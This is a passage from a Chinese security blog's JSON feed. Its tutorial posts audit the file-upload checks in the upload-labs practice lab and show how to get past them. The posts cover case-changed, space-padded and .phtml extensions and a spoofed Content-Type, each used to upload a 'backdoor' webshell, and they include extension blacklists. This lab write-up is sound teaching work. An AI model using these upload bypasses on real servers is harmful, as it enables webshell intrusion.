class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到这回直接过滤了 <code>.htaccess</code>  以及 <code>.phtml</code> ，但是比前几次缺少了后缀名全部转小写的操作，因此存在漏洞。</p>\n<p>抓包，送入 Repeater，将后缀名 php 变成 Php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.Php&quot;</span><br></pre></td></tr></table></figure>\n<p>成功上传</p>\n<p><img src=\"image-20221003170308084.png\" alt=\"image-20221003170308084\"></p>\n<p>连接菜刀即可。</p>\n<p>另外，比起黑名单列一大堆，不如使用 <code>白名单过滤</code> 会更加简洁、安全。</p>\n<h2 id=\"后缀加空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加空格绕过\">#</a> 后缀加空格绕过</h2>\n<p>这是一个 Windows 上才会有的特性，Linux 主机没有。</p>\n<p>以 Less-06 为例：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现，跟前面源码的差距是加入了转换为小写，却<strong>忘记添加上对后缀名去空格</strong>。</p>\n<p>同样，抓包修改，文件名为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php &quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003171112732.png\" alt=\"image-20221003171112732\"></p>\n<p>连接菜刀即可。</p>\n<p>在 windows 主机上一定要对后缀名进行 <code>去空格</code> 操作。</p>\n<p>至此，演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "phtml解析审计+绕过",
            "date_published": "2022-10-03T07:05:25.000Z",
            "content_html": "<h1 id=\"phtml解析审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#phtml解析审计绕过\">#</a> phtml 解析审计 + 绕过</h1>\n<p>总结一下对于以下四种文件类型，可能的绕过方式：</p>\n<ul>\n<li><code>.asp</code> :  <code>.asa</code> /  <code>.cer</code> /  <code>.cdx</code></li>\n<li><code>.aspx</code> :  <code>.ashx</code> /  <code>.asmx</code> /  <code>.ascx</code></li>\n<li><code>.php</code> :  <code>.php4</code> /  <code>.php5</code> /  <code>.pthml</code></li>\n<li><code>.jsp</code> :  <code>.jspx</code> /  <code>.jspf</code></li>\n</ul>\n<h2 id=\"pthml解析审计\"><a class=\"markdownIt-Anchor\" href=\"#pthml解析审计\">#</a> pthml 解析审计</h2>\n<p>其中，关于 pthml 可以去看一下 <code>C:\\phpStudyB\\Apache\\conf\\httpd.conf</code>  文件中对于 php 文件类型的解析</p>\n<p>这里 <code>.pthml</code>  后缀的文件可以被后台解析成 <code>.php</code></p>\n<p><img src=\"image-20221003151119447.png\" alt=\"image-20221003151119447\"></p>\n<p>我们以 Pass-03 为例：</p>\n<p>上传 backdoor.php，点击上传后，显示 “<strong>不允许上传.asp, .aspx, .php, .jsp 后缀文件！</strong>”</p>\n<p><img src=\"image-20221003151302968.png\" alt=\"image-20221003151302968\"></p>\n<p>OK，我们看一下源码信息：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码核心干了这么几件事：</p>\n<p>当文件上传路径存在时</p>\n<ul>\n<li>设置黑名单，过滤 <code>.asp</code> ,  <code>.aspx</code> ,  <code>.php</code> ,  <code>.jsp</code></li>\n<li><code>trim()</code>  函数 <code>过滤</code> 上传文件名的 <code>空格</code></li>\n<li><code>deldot()</code>  函数 <code>删除</code> 文件名 <code>最末尾的点</code> 【这是一种绕过方式，后面的博客会介绍到】</li>\n<li><code>strrchr()</code>  函数以 <code>.点</code> 为截断符，获取其右边的字符串，即获取 <code>文件后缀名</code></li>\n<li><code>strtolower()</code>  函数将文件后缀名全部转换成 <code>小写</code></li>\n<li><code>str_ireplace()</code>  函数将去除后缀名当中的 <code>::$DATA</code> ，是一种 Windows 本地文件系统中的文件流，也是一种绕过方式</li>\n<li>再次调用 <code>trim()</code>  函数对后缀名进行 <code>去空格</code></li>\n</ul>\n<p>另外， <code>$img_path</code>  这回使用了 <code>date函数及其格式化</code> ，再使用了 <code>1000-9999的随机数</code> 作为路径名的组成部分。</p>\n<p>date () 函数的第一个必需参数 <em>format</em> 规定了如何格式化日期 / 时间。</p>\n<p>可以在字母之间插入其他字符，比如 “/”、&quot;.&quot; 或者 “-”，这样就可以增加附加格式了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;Y/m/d&quot;</span>) . <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;Y.m.d&quot;</span>) . <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;Y-m-d&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">上面代码的输出如下所示：</span><br><span class=\"line\"><span class=\"number\">2016</span>/<span class=\"number\">10</span>/<span class=\"number\">21</span></span><br><span class=\"line\"><span class=\"number\">2016.10</span>.<span class=\"number\">21</span></span><br><span class=\"line\"><span class=\"number\">2016</span>-<span class=\"number\">10</span>-<span class=\"number\">21</span></span><br></pre></td></tr></table></figure>\n<p>这里列出了一些可用的字符：</p>\n<ul>\n<li>\n<p>Y - 代表年 （四位，如 2022）</p>\n</li>\n<li>\n<p>m - 代表月 （01 到 12）</p>\n</li>\n<li>\n<p>d - 代表月中的天 （01 到 31）</p>\n</li>\n<li>\n<p>H - 小时，24 小时格式，有前导零 （00 到 23）</p>\n</li>\n<li>\n<p>i - 有前导零的分钟数 （00 到 59）</p>\n</li>\n<li>\n<p>s - 秒数，有前导零 （00 到 59）</p>\n</li>\n</ul>\n<h2 id=\"pthml解析绕过\"><a class=\"markdownIt-Anchor\" href=\"#pthml解析绕过\">#</a> pthml 解析绕过</h2>\n<p>审计完上述代码，发现对于文件后缀并没有过滤完整，放出了诸如 php4、php5、pthml 的类型</p>\n<p>抓包，送入 Repeater</p>\n<h3 id=\"尝试一修改为php4\"><a class=\"markdownIt-Anchor\" href=\"#尝试一修改为php4\">#</a> 尝试一：修改为.php4</h3>\n<p>修改为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php4&quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003154317074.png\" alt=\"image-20221003154317074\"></p>\n<p>打开页面看看，但并没有解析成 php 执行。</p>\n<p><img src=\"image-20221003154519115.png\" alt=\"image-20221003154519115\"></p>\n<h3 id=\"尝试二修改为php5\"><a class=\"markdownIt-Anchor\" href=\"#尝试二修改为php5\">#</a> 尝试二：修改为.php5</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php5&quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003154701928.png\" alt=\"image-20221003154701928\"></p>\n<p>我们打开网页看看，依旧没有解析成功</p>\n<p><img src=\"image-20221003154727447.png\" alt=\"image-20221003154727447\"></p>\n<h3 id=\"尝试三修改为phtml\"><a class=\"markdownIt-Anchor\" href=\"#尝试三修改为phtml\">#</a> 尝试三：修改为.phtml</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.phtml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003154847390.png\" alt=\"image-20221003154847390\"></p>\n<p>打开网页看看，没有原样输出，成功解析。</p>\n<p><img src=\"image-20221003154915997.png\" alt=\"image-20221003154915997\"></p>\n<p>使用菜刀连接：</p>\n<p>①清空缓存库</p>\n<p><img src=\"image-20221003155031987.png\" alt=\"image-20221003155031987\"></p>\n<p>②添加，输入刚刚上传的后门 url，添加参数</p>\n<p><img src=\"image-20221003155130387.png\" alt=\"image-20221003155130387\"></p>\n<p>双击，成功连接。</p>\n<p><img src=\"image-20221003155153049.png\" alt=\"image-20221003155153049\"></p>\n<p>另外，由于解析源码中只罗列了 <code>.php</code> ,  <code>.phtml</code> ，我们可以添加 <code>.txt </code> 或者  <code>.abcd</code>  都可以。</p>\n<p>只要写入了支持解析的类型，重启 Apache 服务，黑客就可以上传对应的后门文件，进行菜刀连接。</p>\n<p>至此，演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "Content-type验证审计+绕过",
            "date_published": "2022-10-03T06:44:03.000Z",
            "content_html": "<h1 id=\"content-type验证审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#content-type验证审计绕过\">#</a> content-type 验证审计 + 绕过</h1>\n<p>本篇讲解对于文件上传漏洞中 ——content type 验证审计 + 绕过</p>\n<h2 id=\"content-type验证审计\"><a class=\"markdownIt-Anchor\" href=\"#content-type验证审计\">#</a> content-type 验证审计</h2>\n<p>来到 Pass-02</p>\n<p><img src=\"image-20221003135212262.png\" alt=\"image-20221003135212262\"></p>\n<p>我们点击上传，会提示 “文件类型不正确，请重新上传”</p>\n<p><img src=\"image-20221003135246520.png\" alt=\"image-20221003135246520\"></p>\n<p>不多说，直接开始抓包，看看怎么个情况。</p>\n<p><img src=\"image-20221003135340470.png\" alt=\"image-20221003135340470\"></p>\n<p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</p>\n<p>通用结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">type/subtype</span><br></pre></td></tr></table></figure>\n<p>MIME 的组成结构非常简单；由类型与子类型两个字符串中间用 <code>'/'</code>  分隔而组成。不允许空格存在。</p>\n<ul>\n<li><code>type</code>  表示可以被分多个子类的独立类别。</li>\n<li><code>subtype</code>  表示细分后的每个类型</li>\n</ul>\n<p>独立类型如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">text/plain</span><br><span class=\"line\">text/html</span><br><span class=\"line\">image/jpeg</span><br><span class=\"line\">image/png</span><br><span class=\"line\">audio/mpeg</span><br><span class=\"line\">audio/ogg</span><br><span class=\"line\">audio/*</span><br><span class=\"line\">video/mp4</span><br><span class=\"line\">application/*</span><br><span class=\"line\">application/json</span><br><span class=\"line\">application/javascript</span><br><span class=\"line\">application/ecmascript</span><br><span class=\"line\">application/octet-stream</span><br><span class=\"line\">…</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003135647652.png\" alt=\"image-20221003135647652\"></p>\n<p>上传文件的时候，Content-Type 有两类标识：</p>\n<ul>\n<li>标识文件上传的请求 multipart/form-data【可用于 <code>HTML表单</code> 从浏览器发送信息给服务器】</li>\n<li>标识文件类型 application/octet-stream 【这是应用程序文件的默认值。意思是 <code>未知的应用程序文件</code> ，浏览器一般不会自动执行或询问执行】</li>\n</ul>\n<p>了解了基本上传格式后，查看源码内容【单击 “显示源码” 按钮】</p>\n<p><img src=\"image-20221003140629128.png\" alt=\"image-20221003140629128\"></p>\n<p>这一段的主要逻辑：</p>\n<ul>\n<li>\n<p>定义 <code>$is_upload</code>  变量，默认值为 false</p>\n</li>\n<li>\n<p>定义 <code>$msg</code>  变量，默认值为空</p>\n</li>\n<li>\n<p><code>isset</code>  函数判断 <code>submit的POST请求</code> 是否为空</p>\n<ul>\n<li>如果为空，什么都不做</li>\n<li>如果不为空，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>判断 <code>UPLOAD_PATH</code>  上传目录是否存在</p>\n<ul>\n<li>如果不存在，则返回 “文件夹不存在，请手工创建”</li>\n<li>如果存在，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>判断 <code>upload_file</code>  的 type 的字段的值是否为 image/jpeg 、png、gif 中的任意一个</p>\n<ul>\n<li>如果不是，则返回 &quot;文件类型不正确，请重新上传&quot;</li>\n<li>如果是，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>定义一个 <code>$temp_file</code>  变量，接收 <code>upload_file</code>  的 <code>tmp_name</code>  字段的值</p>\n<ul>\n<li>\n<p><code>$ _FILES ['upload_file']</code>  表示内置名为 <code>upload_file</code>  的 <code>FILES数组</code></p>\n</li>\n<li>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name type-declaration\">PHP</span> <span class=\"token variable\">$_FILES</span> 是一个预定义的数组，用来获取通过 <span class=\"token constant\">POST</span> 方法上传文件的相关信息。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>如果为单个文件上传，那么 <span class=\"token variable\">$_FILES</span> 为二维数组；</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>如果为多个文件上传，那么 <span class=\"token variable\">$_FILES</span> 为三维数组。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_FILES</span>数组内容如下<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> 客户端文件的原名称。 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token 